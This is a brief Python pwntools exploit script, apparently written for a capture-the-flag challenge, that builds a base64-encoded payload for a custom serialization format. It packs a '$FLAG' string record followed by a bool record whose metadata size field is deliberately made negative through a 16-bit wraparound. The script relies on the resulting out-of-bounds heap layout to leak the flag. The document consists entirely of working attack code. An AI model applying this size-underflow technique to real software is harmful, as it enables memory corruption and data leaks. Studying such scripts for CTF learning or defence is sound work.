from pwn import *

blah = b""

blah += p32(5)  # One string "$FLAG"
blah += b"s"
blah += p16(1)
blah += p16(2)
blah += p16(5)
blah += b"$FLAG"

blah += p32(100)  # Size 100 so that we get malloced further down
blah += b"b"  # One bool "A"
blah += p16(1)
blah += p16(0x10000 - int(sys.argv[1]))  # Negative metadata size
blah += b"A"

print(b64e(blah))
